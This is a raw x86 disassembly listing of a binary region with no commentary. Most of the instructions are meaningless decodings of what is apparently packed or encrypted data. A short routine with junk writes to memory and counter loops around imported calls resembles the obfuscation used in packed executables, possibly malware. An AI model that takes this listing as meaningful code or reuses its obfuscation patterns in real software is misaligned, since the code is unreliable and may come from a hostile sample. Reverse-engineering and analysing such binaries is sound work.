  40d2ab:	outs   dx,DWORD PTR ds:[esi]
  40d2ac:	fisubr DWORD PTR [ebx-0x3a]
  40d2af:	gs xchg esp,eax
  40d2b1:	ins    DWORD PTR es:[edi],dx
  40d2b2:	bound  ecx,QWORD PTR [edx+0x7c]
  40d2b5:	lock cdq 
  40d2b7:	ret    0x1b7c
  40d2ba:	loope  0x40d326
  40d2bc:	add    ch,bl
  40d2be:	push   ds
  40d2bf:	jl     0x40d2e7
  40d2c1:	div    BYTE PTR [ebp-0x82a3b84]
  40d2c7:	sub    edi,DWORD PTR [ebx-0x15]
  40d2ca:	cmp    bx,bp
  40d2cd:	dec    ebp
  40d2ce:	mov    ah,BYTE PTR [edx-0x76]
  40d2d1:	cdq    
  40d2d2:	lock mov edx,0xa1dce5e3
  40d2d8:	jae    0x40d331
  40d2da:	cmp    DWORD PTR [edx],ebx
  40d2dc:	adc    eax,ecx
  40d2de:	popf   
  40d2df:	fmul   QWORD PTR [esi]
  40d2e1:	icebp  
  40d2e2:	jae    0xde22b787
  40d2e8:	xchg   ecx,eax
  40d2e9:	jnp    0x40d36a
  40d2eb:	pop    ebp
  40d2ec:	cdq    
  40d2ed:	mov    esi,0x50409ef7
  40d2f2:	aad    0xed
  40d2f4:	inc    ebx
  40d2f5:	dec    ebp
  40d2f6:	cmp    al,0x44
  40d2f8:	cdq    
  40d2f9:	xor    al,0xda
  40d2fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d2fc:	dec    ebx
  40d2fd:	xor    al,0x52
  40d2ff:	outs   dx,BYTE PTR ds:[esi]
  40d300:	add    al,0xe3
  40d302:	dec    ebp
  40d303:	hlt    
  40d304:	xor    DWORD PTR [esp+eiz*2-0x24],ecx
  40d308:	test   DWORD PTR [ebx],ecx
  40d30a:	or     DWORD PTR [ebp+0x6bf44e0],esp
  40d310:	jae    0x40d294
  40d312:	dec    ebx
  40d313:	mov    ch,bh
  40d315:	xor    cl,ch
  40d317:	inc    ebp
  40d318:	mov    cl,0xd2
  40d31a:	stc    
  40d31b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d31c:	loop   0x40d35d
  40d31e:	leave  
  40d31f:	(bad)  
  40d320:	push   esi
  40d321:	push   eax
  40d322:	xor    ebx,ebx
  40d324:	mov    edx,esp
  40d326:	dec    edx
  40d327:	jmp    0x40d58a
  40d32c:	fwait
  40d32d:	push   es
  40d32e:	mov    bl,0x2a
  40d330:	mov    bl,0xab
  40d332:	mov    ds:0x57b64c97,eax
  40d337:	pop    ebx
  40d338:	jle    0x40d353
  40d33a:	imul   ebx,DWORD PTR [edi-0x50],0xffffff97
  40d33e:	jle    0x40d3be
  40d340:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40d344:	(bad)  
  40d345:	dec    edx
  40d346:	cmp    al,0x6d
  40d348:	sar    DWORD PTR [di-0x4c],0xfa
  40d34d:	pop    ss
  40d34e:	jmp    0x47d77ec9
  40d353:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d354:	push   ds
  40d355:	dec    edx
  40d356:	mov    al,ds:0x1d1361ef
  40d35b:	sub    al,BYTE PTR [eax+0x2a86d5b4]
  40d361:	or     ch,al
  40d363:	xor    ebx,DWORD PTR [ebp-0x7f]
  40d366:	pop    edi
  40d367:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d368:	pop    ss
  40d369:	lods   eax,DWORD PTR ds:[esi]
  40d36a:	jge    0x40d313
  40d36c:	pop    ebx
  40d36d:	pop    ss
  40d36e:	or     ebp,DWORD PTR ds:[esi+edx*4+0x6c19ada8]
  40d376:	push   esp
  40d377:	retf   
  40d378:	bound  ecx,QWORD PTR [ebp+ebp*8+0xb]
  40d37c:	cs iret 
  40d37e:	sbb    BYTE PTR [ecx],0x84
  40d381:	xchg   ebx,eax
  40d382:	sbb    al,0xda
  40d384:	push   ebp
  40d385:	fist   DWORD PTR [ebp+0x7c26ff0a]
  40d38b:	mov    ch,0xb8
  40d38d:	outs   dx,DWORD PTR ds:[esi]
  40d38e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d38f:	dec    edx
  40d390:	cli    
  40d391:	xchg   esp,eax
  40d392:	adc    eax,0x4c9ea34e
  40d397:	sbb    DWORD PTR [ecx-0x12],eax
  40d39a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d39b:	pop    edx
  40d39c:	nop
  40d39d:	xchg   ecx,eax
  40d39e:	or     DWORD PTR [ecx-0x2d],0xffffffa6
  40d3a2:	add    eax,0xb9fe2536
  40d3a7:	fldenv [ebp-0x33c45bcc]
  40d3ad:	jmp    0x2534:0xde5565e9
  40d3b4:	cmp    eax,0xc92046e2
  40d3b9:	sar    ecx,cl
  40d3bb:	cli    
  40d3bc:	sub    BYTE PTR [ebx],ch
  40d3be:	push   ebp
  40d3bf:	sti    
  40d3c0:	test   esp,0x685f2a1e
  40d3c6:	jnp    0x40d434
  40d3c8:	cs dec edi
  40d3ca:	fwait
  40d3cb:	lahf   
  40d3cc:	mov    eax,0xe4e1e0c9
  40d3d1:	mov    ds:0xccbd04f7,eax
  40d3d6:	sti    
  40d3d7:	lods   eax,DWORD PTR ds:[esi]
  40d3d8:	js     0x40d41c
  40d3da:	pop    ebx
  40d3db:	cmp    DWORD PTR ds:0x651d4193,ebx
  40d3e1:	loope  0x40d3e0
  40d3e3:	jno    0x40d3d6
  40d3e5:	and    BYTE PTR ds:0x51b62c92,0xc6
  40d3ec:	(bad)  
  40d3ed:	fdiv   QWORD PTR [edi]
  40d3ef:	(bad)  
  40d3f0:	ret    0xb392
  40d3f3:	adc    ebx,ecx
  40d3f5:	inc    edi
  40d3f6:	xlat   BYTE PTR ds:[ebx]
  40d3f7:	out    dx,eax
  40d3f8:	lds    edi,FWORD PTR [edi]
  40d3fa:	xchg   ecx,eax
  40d3fb:	fstp   TBYTE PTR [bp+si-0x1bb]
  40d400:	xchg   edx,eax
  40d401:	test   DWORD PTR [eax+0x20],ecx
  40d404:	in     al,dx
  40d405:	les    ebp,FWORD PTR [esi]
  40d407:	sub    BYTE PTR [edi],ch
  40d409:	gs inc esi
  40d40b:	stos   BYTE PTR es:[edi],al
  40d40c:	cmp    ebp,DWORD PTR [edx+0x1d26bafa]
  40d412:	dec    ebx
  40d413:	inc    edi
  40d414:	push   eax
  40d415:	xor    eax,0xb87ea23c
  40d41a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d41b:	pusha  
  40d41c:	sbb    edx,DWORD PTR [esi+0x19]
  40d41f:	(bad)  
  40d420:	mov    cl,0xa7
  40d422:	fidiv  DWORD PTR [esi+0x5c7f7030]
  40d428:	scas   al,BYTE PTR es:[edi]
  40d429:	sub    esi,0xffffffb9
  40d42c:	sub    eax,0x9bf17e64
  40d431:	out    0x39,al
  40d433:	jns    0x40d3fa
  40d435:	jbe    0x40d46b
  40d437:	inc    ebx
  40d438:	lods   al,BYTE PTR ds:[esi]
  40d439:	jae    0x40d496
  40d43b:	pop    ecx
  40d43c:	ja     0x40d4a8
  40d43e:	xor    edx,esi
  40d440:	adc    DWORD PTR [eax+0x32ddb2d5],0x30
  40d447:	icebp  
  40d448:	ss bnd fs jne 0x40d49d
  40d44d:	stos   BYTE PTR es:[edi],al
  40d44e:	mov    BYTE PTR [esi],cl
  40d450:	(bad)  
  40d451:	lock sub al,0x25
  40d454:	stc    
  40d455:	dec    edx
  40d456:	or     BYTE PTR [si-0x304d],0xf4
  40d45c:	or     al,0xca
  40d45e:	jno    0x40d42c
  40d460:	retf   0x12ab
  40d463:	icebp  
  40d464:	mov    ecx,0xc961e509
  40d469:	jp     0x40d4ac
  40d46b:	or     al,0x83
  40d46d:	mov    al,0x3d
  40d46f:	test   BYTE PTR [ebp+0x22],bh
  40d472:	jbe    0x40d44c
  40d474:	or     eax,0x86cb04d1
  40d479:	xor    DWORD PTR [esp+ebp*8+0x3],edi
  40d47d:	mov    cs,WORD PTR ds:0x16bcdcde
  40d483:	lods   eax,DWORD PTR ds:[esi]
  40d484:	adc    dh,BYTE PTR ds:0xc327ed3f
  40d48a:	imul   ecx,esi,0x8d88330a
  40d490:	clc    
  40d491:	mov    edi,0x5ba684f
  40d496:	dec    ecx
  40d497:	lea    esi,[edi-0x5e]
  40d49a:	repz mov edi,0x3be60db1
  40d4a0:	xchg   esi,eax
  40d4a1:	cli    
  40d4a2:	loopne 0x40d48b
  40d4a4:	mov    bh,0x62
  40d4a6:	and    DWORD PTR [ebp-0x5bba7ab0],0xa0fc9f80
  40d4b0:	aam    0x4e
  40d4b2:	push   ss
  40d4b3:	lock jnp 0x40d4c6
  40d4b6:	popf   
  40d4b7:	push   ebp
  40d4b8:	popf   
  40d4b9:	xchg   ah,bl
  40d4bb:	ins    DWORD PTR es:[edi],dx
  40d4bc:	stos   DWORD PTR es:[edi],eax
  40d4bd:	sub    al,0x9f
  40d4bf:	jmp    0x40d44f
  40d4c1:	enter  0xfa71,0x29
  40d4c5:	sbb    esp,DWORD PTR [edx]
  40d4c7:	into   
  40d4c8:	xchg   esi,eax
  40d4c9:	sbb    DWORD PTR [ebp+0x3b],esp
  40d4cc:	out    dx,al
  40d4cd:	and    BYTE PTR [edi],ah
  40d4cf:	call   0xf37f:0xe56a719
  40d4d6:	xor    al,0x73
  40d4d8:	dec    ebp
  40d4d9:	dec    edx
  40d4da:	ficom  WORD PTR [edx]
  40d4dc:	push   cs
  40d4dd:	sub    BYTE PTR [edi],bl
  40d4df:	mov    bh,0xb8
  40d4e1:	inc    esp
  40d4e2:	int    0xde
  40d4e4:	mov    ch,0xed
  40d4e6:	in     al,dx
  40d4e7:	mov    edi,0x39cc601d
  40d4ec:	add    DWORD PTR [eax-0x2a80797e],esi
  40d4f2:	mov    ds:0x2aebd03a,eax
  40d4f7:	aam    0xc5
  40d4f9:	pop    ss
  40d4fa:	pop    eax
  40d4fb:	add    ecx,edi
  40d4fd:	test   BYTE PTR [ebx-0x61f57eb0],cl
  40d503:	dec    esi
  40d504:	rcr    DWORD PTR [edi-0x7a],1
  40d507:	sar    BYTE PTR [ecx-0x5c9e53e2],cl
  40d50d:	inc    edx
  40d50e:	pop    esp
  40d50f:	jno    0x40d4f6
  40d511:	lahf   
  40d512:	loope  0x40d514
  40d514:	imul   edx,edx,0xfffffff7
  40d517:	clts   
  40d519:	add    DWORD PTR [eax+0x656f777],ecx
  40d51f:	and    eax,DWORD PTR [edi+esi*1+0x62]
  40d523:	aas    
  40d524:	fld    DWORD PTR [ebx-0x768aecb5]
  40d52a:	(bad)  [edi-0x40]
  40d52d:	ds rol ebp,0xf2
  40d531:	shl    BYTE PTR [edi+edx*8],cl
  40d534:	xlat   BYTE PTR ds:[ebx]
  40d535:	jecxz  0x40d512
  40d537:	jno    0x40d57b
  40d539:	dec    ecx
  40d53a:	dec    eax
  40d53b:	mov    eax,0x29e8d774
  40d540:	ins    DWORD PTR es:[edi],dx
  40d541:	popf   
  40d542:	das    
  40d543:	ror    esi,cl
  40d545:	sub    bl,BYTE PTR [ecx]
  40d547:	mov    al,ds:0x7c70d314
  40d54c:	jp     0x40d52e
  40d54e:	push   0x23
  40d550:	dec    esp
  40d551:	sub    al,0x7c
  40d553:	mov    cl,0x9e
  40d555:	adc    eax,0x3c6def32
  40d55a:	stos   BYTE PTR es:[edi],al
  40d55b:	cmp    ecx,DWORD PTR [ecx+0x861e44d]
  40d561:	frstor ds:0xc55b0812
  40d567:	daa    
  40d568:	xchg   edx,eax
  40d569:	mov    edx,0x18dd6133
  40d56e:	enter  0xc2bf,0x86
  40d572:	loopne 0x40d554
  40d574:	pop    ecx
  40d575:	xor    al,0xb0
  40d577:	sub    bh,BYTE PTR [edi-0x6]
  40d57a:	mov    esp,ebp
  40d57c:	pop    edx
  40d57d:	push   0x5d
  40d57f:	les    edi,FWORD PTR [eax+0x6df4ebca]
  40d585:	xchg   DWORD PTR [edi],eax
  40d587:	or     eax,0x3431020
  40d58c:	sbb    al,0x1a
  40d58e:	dec    ebx
  40d58f:	xor    edx,edx
  40d591:	add    DWORD PTR [ebp-0xc],ebx
  40d594:	pop    ebx
  40d595:	mov    eax,DWORD PTR [ebp-0xc]
  40d598:	pop    edi
  40d599:	pop    esi
  40d59a:	pop    ebx
  40d59b:	leave  
  40d59c:	ret    0x10
  40d59f:	push   ebp
  40d5a0:	mov    ebp,esp
  40d5a2:	push   ecx
  40d5a3:	not    eax
  40d5a5:	push   ecx
  40d5a6:	mov    eax,0xf89c8532
  40d5ab:	mov    DWORD PTR ds:0x433723,ecx
  40d5b1:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40d5b8:	mov    DWORD PTR ds:0x433717,edx
  40d5be:	push   esi
  40d5bf:	mov    DWORD PTR ds:0x43371b,0x1f1b
  40d5c9:	mov    DWORD PTR [ebp-0x8],eax
  40d5cc:	mov    DWORD PTR ds:0x433727,0x659
  40d5d6:	mov    ecx,DWORD PTR [ebp+0x8]
  40d5d9:	push   edi
  40d5da:	not    edi
  40d5dc:	mov    edi,0x7510854
  40d5e1:	not    DWORD PTR ds:0x433763
  40d5e7:	mov    esi,0x32729b
  40d5ec:	mov    DWORD PTR ds:0x43371b,0x27d6
  40d5f6:	cmp    ecx,eax
  40d5f8:	mov    DWORD PTR ds:0x4337a7,0x52ab
  40d602:	je     0x40d94e
  40d608:	mov    eax,DWORD PTR [ebp-0x4]
  40d60b:	mov    ecx,DWORD PTR [ebp+0xc]
  40d60e:	sub    DWORD PTR ds:0x4337af,0x32
  40d618:	xor    eax,edi
  40d61a:	add    eax,esi
  40d61c:	mov    DWORD PTR ds:0x4336db,0x51fb
  40d626:	cmp    eax,ecx
  40d628:	mov    DWORD PTR ds:0x43375b,0x5a
  40d632:	je     0x40d94e
  40d638:	and    DWORD PTR ds:0x433797,0x0
  40d642:	mov    edx,DWORD PTR ds:0x433797
  40d648:	inc    edx
  40d649:	mov    DWORD PTR ds:0x433797,edx
  40d64f:	cmp    DWORD PTR ds:0x433797,0x25
  40d656:	jne    0x40d665
  40d65c:	push   DWORD PTR [ebp-0xc]
  40d65f:	call   DWORD PTR ds:0x4122a8
  40d665:	cmp    DWORD PTR ds:0x433797,0x18
  40d66c:	jb     0x40d642
  40d672:	and    DWORD PTR ds:0x4336e3,0x0
  40d67c:	xor    edx,edx
  40d67e:	add    edx,DWORD PTR ds:0x4336e3
  40d684:	inc    edx
  40d685:	mov    DWORD PTR ds:0x4336e3,edx
  40d68b:	cmp    DWORD PTR ds:0x4336e3,0x1c
  40d692:	jne    0x40d6a3
  40d698:	push   0x4337d3
  40d69d:	call   DWORD PTR ds:0x412360
  40d6a3:	cmp    DWORD PTR ds:0x4336e3,0x1b
  40d6aa:	jb     0x40d67c
  40d6b0:	movzx  eax,BYTE PTR ds:0x4336e7
  40d6b7:	add    eax,DWORD PTR ds:0x43371b
  40d6bd:	mov    ds:0x4336e7,eax
  40d6c2:	mov    eax,DWORD PTR [ebp-0x4]
  40d6c5:	xor    eax,edi
  40d6c7:	add    eax,esi
  40d6c9:	push   eax
  40d6ca:	push   DWORD PTR [ebp-0x8]
  40d6cd:	push   DWORD PTR [ebp-0x4]
  40d6d0:	mov    edx,DWORD PTR ds:0x413b34
  40d6d6:	call   0x4057b9
  40d6db:	mov    ecx,DWORD PTR ds:0x413b34
  40d6e1:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40d6e7:	jmp    0x40d944
  40d6ec:	mov    esi,0x704a1816
  40d6f1:	jo     0x40d75f
  40d6f3:	adc    al,BYTE PTR ds:0xa4a0482a
  40d6f9:	dec    esp
  40d6fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d6fb:	push   0x7a
  40d6fd:	xchg   edx,eax
  40d6fe:	jle    0x40d77e
  40d700:	ds jl  0x40d781
  40d703:	jle    0x40d6ba
  40d705:	push   es
  40d706:	into   
  40d707:	dec    esp
  40d708:	sbb    al,0x89
  40d70a:	loope  0x40d6f5
  40d70c:	jle    0x40d6e7
  40d70e:	or     ebx,DWORD PTR [ebp-0x3f275bf7]
  40d714:	xchg   edi,eax
  40d715:	sub    ebp,DWORD PTR [edx]
  40d717:	imul   ecx,edx,0x2f
  40d71a:	jg     0x40d78f
  40d71c:	mov    edx,0x62a33477
  40d721:	daa    
  40d722:	cmp    esi,DWORD PTR [eax]
  40d724:	mov    eax,0x6e397816
  40d729:	pop    edx
  40d72a:	pop    es
  40d72b:	(bad)  
  40d72c:	jg     0x40d72b
  40d72e:	sub    BYTE PTR [edi],dl
  40d730:	daa    
  40d731:	es mov ebx,0x2f524226
  40d737:	outs   dx,BYTE PTR ds:[esi]
  40d738:	push   cs
  40d739:	daa    
  40d73a:	push   ds
  40d73b:	cmp    eax,0xb6b601a6
  40d740:	pop    ebx
  40d741:	out    0x63,al
  40d743:	inc    ebp
  40d744:	dec    edi
  40d745:	jnp    0x40d7b5
  40d747:	pusha  
  40d748:	cmc    
  40d749:	iret   
  40d74a:	push   ebx
  40d74b:	cmp    al,0x73
  40d74d:	gs jmp 0x282c10ad
  40d753:	mov    ebx,0x36228b6d
  40d758:	mov    ebp,0x11dbbc3e
  40d75d:	jmp    FWORD PTR [edx-0x25]
  40d760:	(bad)  
  40d761:	in     eax,dx
  40d762:	shr    esp,0x53
  40d765:	call   0x706f:0xa256f6a
  40d76c:	and    al,0x0
  40d76e:	test   DWORD PTR [edx+edi*4-0x58],ecx
  40d772:	adc    ch,dl
  40d774:	mov    ebx,0x400accf8
  40d779:	inc    ecx
  40d77a:	xchg   edx,eax
  40d77b:	xor    al,0x3b
  40d77d:	mov    ds:0xf5b3160,eax
  40d782:	call   0xd24c13f
  40d787:	mov    cl,0x2d
  40d789:	sahf   
  40d78a:	or     esp,0x9df26d4c
  40d790:	sub    dh,BYTE PTR [edi-0x7]
  40d793:	sbb    eax,0x11f6c689
  40d798:	dec    edi
  40d799:	push   ebp
  40d79a:	dec    ecx
  40d79b:	aam    0x73
  40d79d:	jb     0x40d7f5
  40d79f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d7a0:	pop    esi
  40d7a1:	out    0x96,al
  40d7a3:	ret    
  40d7a4:	jae    0x40d75c
  40d7a6:	pop    esi
  40d7a7:	dec    ebp
  40d7a8:	jae    0x40d786
  40d7aa:	outs   dx,DWORD PTR ds:[esi]
  40d7ab:	pop    ebp
  40d7ac:	mov    al,ds:0xf9be3078
  40d7b1:	pop    edi
  40d7b2:	in     al,0xc1
  40d7b4:	call   0xe39dd74c
  40d7b9:	mov    ah,0x1
  40d7bb:	and    ebx,DWORD PTR [edx]
  40d7bd:	fldcw  WORD PTR [esi+ebp*2-0x2c5a06f]
  40d7c4:	scas   eax,DWORD PTR es:[edi]
  40d7c5:	add    al,0xfd
  40d7c7:	in     eax,0x14
  40d7c9:	jns    0x40d7a6
  40d7cb:	retf   
  40d7cc:	lds    ecx,FWORD PTR [edi-0x523d2f86]
  40d7d2:	test   al,0x37
  40d7d4:	loopne 0x40d759
  40d7d6:	sbb    eax,DWORD PTR [edx-0x4b]
  40d7d9:	ins    DWORD PTR es:[edi],dx
  40d7da:	idiv   BYTE PTR [edi]
  40d7dc:	mov    eax,ds:0x5e44afc0
  40d7e1:	cmp    dh,BYTE PTR [eax+0x1d4c03ea]
  40d7e7:	adc    eax,0x2bbfb444
  40d7ec:	mov    ch,0x97
  40d7ee:	retf   0x31a4
  40d7f1:	sub    bl,BYTE PTR [edi]
  40d7f3:	cmp    DWORD PTR [esp+edi*1+0x49],ecx
  40d7f7:	test   edi,0xd2b91598
  40d7fd:	add    ebx,DWORD PTR [ebx]
  40d7ff:	scas   eax,DWORD PTR es:[edi]
  40d800:	mov    ebx,0x8611d573
  40d805:	push   esp
  40d806:	push   ss
  40d807:	and    eax,0xda26c62a
  40d80c:	xchg   DWORD PTR [eax+0x23],edx
  40d80f:	cmp    esi,DWORD PTR [ecx+0x47d7996d]
  40d815:	scas   al,BYTE PTR es:[edi]
  40d816:	popa   
  40d817:	sbb    eax,0x438536d1
  40d81c:	push   ss
  40d81d:	jnp    0x40d890
  40d81f:	adc    edi,ecx
  40d821:	cmp    ecx,DWORD PTR [edi-0x16]
  40d824:	jbe    0x40d898
  40d826:	adc    esi,DWORD PTR [edi-0x325f272f]
  40d82c:	test   eax,0x1d9b8d49
  40d831:	out    dx,al
  40d832:	popa   
  40d833:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d834:	outs   dx,BYTE PTR ds:[esi]
  40d835:	mov    ch,0xf3
  40d837:	test   eax,0xb4fdd556
  40d83c:	(bad)  
  40d83d:	fstp   DWORD PTR [edx-0x11bf19b9]
  40d843:	xor    dl,BYTE PTR [ebp-0x35b9d98d]
  40d849:	push   esp
  40d84a:	mov    ebp,0xc2bfe95e
  40d84f:	scas   eax,DWORD PTR es:[edi]
  40d850:	(bad)  
  40d852:	push   ecx
  40d853:	daa    
  40d854:	daa    
  40d855:	or     DWORD PTR [esi+0xd],0x12
  40d859:	xchg   DWORD PTR [ecx+0x49],edx
  40d85c:	xor    bh,BYTE PTR [ebp+0x39200b19]
  40d862:	test   eax,0xd3c28f06
  40d867:	cmp    eax,0xbcb7679f
  40d86c:	fsubr  QWORD PTR [esi-0xa3d8ad9]
  40d872:	mov    ecx,0x7edc00d0
  40d877:	cld    
  40d878:	cmp    eax,0x3dfd0956
  40d87d:	cmp    esp,DWORD PTR [ebx]
  40d87f:	mov    ah,0x5a
  40d881:	mov    ah,0x46
  40d883:	xchg   ebp,eax
  40d884:	sub    ah,ch
  40d886:	ja     0x40d81e
  40d888:	stos   BYTE PTR es:[edi],al
  40d889:	add    DWORD PTR [edi],ebx
  40d88b:	outs   dx,DWORD PTR ds:[esi]
  40d88c:	xor    al,0xec
  40d88e:	and    al,0x77
  40d890:	push   ds
  40d891:	loopne 0x40d822
  40d893:	inc    ebx
  40d894:	pop    edi
  40d895:	aad    0xbb
  40d897:	fnstsw WORD PTR [edi+0x27]
  40d89a:	and    cl,BYTE PTR [ebx]
  40d89c:	pop    ss
  40d89d:	inc    esi
  40d89e:	cmp    BYTE PTR [ebp+0x2fa80299],dl
  40d8a4:	outs   dx,BYTE PTR ds:[esi]
  40d8a5:	daa    
  40d8a6:	fistp  DWORD PTR [edi-0x21]
  40d8a9:	lds    ebp,FWORD PTR [edx]
  40d8ab:	pop    edx
  40d8ac:	leave  
  40d8ad:	retf   0xedd9
  40d8b0:	inc    ebp
  40d8b1:	mov    ds:0xfb9f90a8,al
  40d8b6:	es rcr esi,0x7a
  40d8ba:	xchg   edx,eax
  40d8bb:	mov    al,0x38
  40d8bd:	test   DWORD PTR [ebp-0x3498e977],0xc10d2214
  40d8c7:	adc    al,0x5b
  40d8c9:	adc    eax,0xcc7045d0
  40d8ce:	mov    bl,0xd3
  40d8d0:	xchg   DWORD PTR [edx+ebx*2],edx
  40d8d3:	push   cs
  40d8d4:	jbe    0x40d952
  40d8d6:	sub    BYTE PTR [eax+0x72786d9],ah
  40d8dc:	call   0xb5c1:0xe3f6131d
  40d8e3:	jmp    0xeb3bb8ad
  40d8e8:	sub    eax,0xbc927953
  40d8ed:	das    
  40d8ee:	adc    dh,ch
  40d8f0:	test   cl,0x62
  40d8f3:	fisttp WORD PTR [ecx-0x77c8eb51]
  40d8f9:	pop    edx
  40d8fa:	mov    bh,BYTE PTR [edi]
  40d8fc:	(bad)  
  40d8fd:	loop   0x40d8e3
  40d8ff:	js     0x40d8d1
  40d901:	leave  
  40d902:	(bad)  
  40d903:	aam    0x2a
  40d905:	mov    BYTE PTR [ebx],cl
  40d907:	dec    ecx
  40d908:	sbb    ah,BYTE PTR [edi+0x6d76277]
  40d90e:	push   edi
  40d90f:	arpl   WORD PTR [ebp+0x5e613017],dx
  40d915:	cmp    edx,DWORD PTR [ecx+0x21]
  40d918:	sub    eax,0x5c646f54
  40d91d:	push   ss
  40d91e:	xchg   ecx,eax
  40d91f:	xchg   ecx,eax
  40d920:	sub    dl,BYTE PTR [ecx]
  40d922:	scas   eax,DWORD PTR es:[edi]
  40d923:	jle    0x40d95f
  40d925:	mov    al,ds:0xca1bf5b7
  40d92a:	cmp    al,0x82
  40d92c:	aad    0x21
  40d92e:	or     bl,BYTE PTR [esi+0x4e11d788]
  40d934:	les    esi,FWORD PTR ds:0xcc4599b6
  40d93a:	repnz loope 0x40d8e9
  40d93d:	dec    esi
  40d93e:	mov    esi,0x3d0f1351
  40d943:	xor    DWORD PTR [ecx-0x7ba74ff],ecx
  40d949:	jmp    0x40de40
  40d94e:	mov    eax,DWORD PTR [ebp-0x4]
  40d951:	mov    ecx,DWORD PTR [ebp+0x10]
  40d954:	xor    eax,edi
  40d956:	add    eax,esi
  40d958:	jmp    0x40dbb5
  40d95d:	or     DWORD PTR [ebx+0x1f],0x4172f5e2
  40d964:	imul   ebx,DWORD PTR [ecx],0x972b51ed
  40d96a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d96b:	jne    0x40d99c
  40d96d:	cmp    dl,BYTE PTR [eax+0x7c3e7e7e]
  40d973:	jle    0x40d9f3
  40d975:	or     eax,0x49af1591
  40d97a:	mov    ebx,DWORD PTR [eax]
  40d97c:	and    BYTE PTR [edi+0x39914f26],dl
  40d982:	xchg   ecx,eax
  40d983:	jb     0x40d9dd
  40d985:	nop
  40d986:	and    al,0xc1
  40d988:	call   0x3cb25f78
  40d98d:	cmc    
  40d98e:	(bad)  
  40d98f:	jmp    0x62d4:0x1e17b3f
  40d996:	push   ebp
  40d997:	xor    bh,ah
  40d999:	pop    edi
  40d99a:	outs   dx,BYTE PTR ds:[esi]
  40d99b:	sub    al,0x94
  40d99d:	add    al,0x95
  40d99f:	repnz cmp cl,BYTE PTR [esi-0x4e]
  40d9a3:	daa    
  40d9a4:	lods   al,BYTE PTR ds:[esi]
  40d9a5:	xchg   ecx,eax
  40d9a6:	mov    esi,0x50666b3a
  40d9ab:	mov    al,0x88
  40d9ad:	sbb    bh,ah
  40d9af:	push   esi
  40d9b0:	pop    esp
  40d9b1:	lock mov edi,0xecd6d611
  40d9b7:	pop    eax
  40d9b8:	pop    esi
  40d9b9:	jne    0x40d9cb
  40d9bb:	mov    bh,BYTE PTR [ecx-0x11]
  40d9be:	dec    edi
  40d9bf:	addr16 mov eax,0x11c24d2e
  40d9c5:	iret   
  40d9c6:	out    0x8d,al
  40d9c8:	jl     0x40d9c5
  40d9ca:	mov    eax,0x681b9d74
  40d9cf:	xchg   ebp,eax
  40d9d0:	jp     0x40d956
  40d9d2:	fdivr  DWORD PTR [ecx]
  40d9d4:	push   0x5d
  40d9d6:	mov    dh,0x15
  40d9d8:	imul   eax,DWORD PTR ss:[edi-0x7a],0x58ad53d3
  40d9e0:	test   al,0x23
  40d9e2:	lea    edi,[edx+edi*2-0x426952c7]
  40d9e9:	adc    esp,DWORD PTR [esi-0x7cb61e15]
  40d9ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d9f0:	mov    ah,0xf6
  40d9f2:	jg     0x40da35
  40d9f4:	mov    ebp,0xef05b031
  40d9f9:	mov    esp,?
  40d9fb:	hlt    
  40d9fc:	mov    eax,ds:0x77fd5d53
  40da01:	or     DWORD PTR [esi],edi
  40da03:	hlt    
  40da04:	std    
  40da05:	test   DWORD PTR [edi],edx
  40da07:	leave  
  40da08:	and    ah,0xb4
  40da0b:	nop
  40da0c:	iret   
  40da0d:	adc    BYTE PTR [edx-0x37],0xcd
  40da11:	bound  edx,QWORD PTR [esi-0x486fdc9a]
  40da17:	or     eax,0x862f2186
  40da1c:	adc    eax,0xaca32158
  40da21:	into   
  40da22:	imul   ecx,DWORD PTR [ebx-0x9],0x2b39f058
  40da29:	mov    esp,0xd704af46
  40da2e:	mov    edi,0x2ef7b613
  40da33:	push   esp
  40da34:	aas    
  40da35:	call   0xdf3c:0xce3a0e9a
  40da3c:	repnz mov eax,0x43414804
  40da42:	push   esi
  40da43:	pop    ss
  40da44:	sbb    BYTE PTR [edx],ch
  40da46:	add    eax,DWORD PTR [ebp+eiz*8+0x19facaf1]
  40da4d:	aas    
  40da4e:	sbb    al,0x64
  40da50:	inc    ebx
  40da51:	jge    0x40da66
  40da53:	add    DWORD PTR ds:0xcff2b1a1,ecx
  40da59:	in     eax,0xe5
  40da5b:	(bad)  
  40da5c:	hlt    
  40da5d:	(bad)  
  40da5e:	xor    esp,DWORD PTR [esp+ebx*8+0x7e]
  40da62:	aas    
  40da63:	inc    ebx
  40da64:	aas    
  40da65:	js     0x40da91
  40da67:	repz test BYTE PTR [edx-0x26],0xc1
  40da6c:	xor    ah,bl
  40da6e:	call   0x1694:0x4803defb
  40da75:	mov    BYTE PTR [ebx-0x5d],ah
  40da78:	sbb    ecx,ebx
  40da7a:	sub    eax,0xa0d54d87
  40da7f:	xchg   cl,bh
  40da81:	and    edx,DWORD PTR [ebp+ebx*2+0x26800b3]
  40da88:	xchg   ecx,eax
  40da89:	push   edx
  40da8a:	mov    eax,ds:0xb0465164
  40da8f:	daa    
  40da90:	and    ebx,DWORD PTR ds:0xfa34dbf8
  40da96:	cwde   
  40da97:	mov    DWORD PTR [edi-0x65],esi
  40da9a:	dec    ebp
  40da9b:	sbb    ah,BYTE PTR [ebx+0x6fe065f4]
  40daa1:	xlat   BYTE PTR ds:[ebx]
  40daa2:	push   0xffffffcc
  40daa4:	in     al,dx
  40daa5:	and    DWORD PTR [edx],0x2f074ac2
  40daab:	or     eax,0xa18c7035
  40dab0:	das    
  40dab1:	xchg   ebp,eax
  40dab2:	add    ecx,DWORD PTR [ecx-0x4a788170]
  40dab8:	sub    ecx,edi
  40daba:	sar    BYTE PTR [edi-0x30],0x83
  40dabe:	jb     0x40dac0
